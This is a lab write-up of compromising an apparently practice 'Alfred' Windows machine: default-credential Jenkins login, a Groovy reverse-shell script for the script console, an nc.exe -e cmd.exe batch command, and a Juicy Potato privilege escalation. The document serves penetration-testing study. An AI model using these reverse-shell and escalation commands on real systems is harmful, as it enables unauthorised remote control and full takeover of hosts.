---
title: "Alfred"
description: "Enum Nmap : Port 8080 Jenkins we can login using guessing password, I tired admin:admin and it works Exploit Jenkins go to script console, This console allows a user to run"
lang: "en"
translationKey: "alfred"
category: "lab-writeups"
tags: ["Lab", "Juicy Potato", "jenkins-revshell", "Windows"]
publishDate: "2024-12-15"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "15d5fca1-ed80-803f-b8a0-fd922ad09741"
notionUrl: "https://app.notion.com/p/Alfred-15d5fca1ed80803fb8a0fd922ad09741"
notionLastEdited: "2025-06-11T22:39:00.000Z"
---

# Enum

Nmap :

![](/images/alfred/9abd459da010.png)

# Port 8080 (Jenkins)

![](/images/alfred/40db82896a47.png)

we can login using guessing password, I tired `admin:admin` and it works

![](/images/alfred/55ad82e718e4.png)

### Exploit Jenkins

go to **script console, **This console allows a user to run commands for automation and reporting 
using a groovy script. By exploiting this privilege, the attacker can use [revsh.groovy](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) to get a reverse shell session back to the attacker machine.

![](/images/alfred/56dff536052d.png)

revsh.groovy :

```bash
String host=”10.9.4.211”;
int port=8044;
String cmd=”cmd.exe”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Run the script from the Groovy console and a bash session will connect to the Netcat listener. The attacker can now run commands as user Jenkins.

![](/images/alfred/342b00588264.png)

### Submit Flag user.txt

![](/images/alfred/b59a87dd2de3.png)

## Winpriv

run command `whoami /priv` to check our user privilege

![](/images/alfred/9ac2d1aba2c5.png)

we see that we have **SeImpersonatePrivilege**, let’s we user one of potato attack for doing privileges.

### Juicy Potato Exploit

![](/images/alfred/5e25bd0bbcad.png)

Creating a batch file for getting shell on our machine

```bash
echo "C:\Users\bruce\nc.exe" -e cmd.exe 10.9.4.211 9186 > priv.bat
```

![](/images/alfred/9b5ead47206f.png)

Executing potato attack and grab reverse shell using netcat

`{03ca98d6-ff5d-49b8-abc6-03dd84127020}` - CLSID, more of them at [CLSID](http://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/)

```bash
jp.exe -p "C:\Users\bruce\priv.bat" -l 9186 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

![](/images/alfred/7ec50c2a9ab8.png)

![](/images/alfred/c7cb422263c5.png)
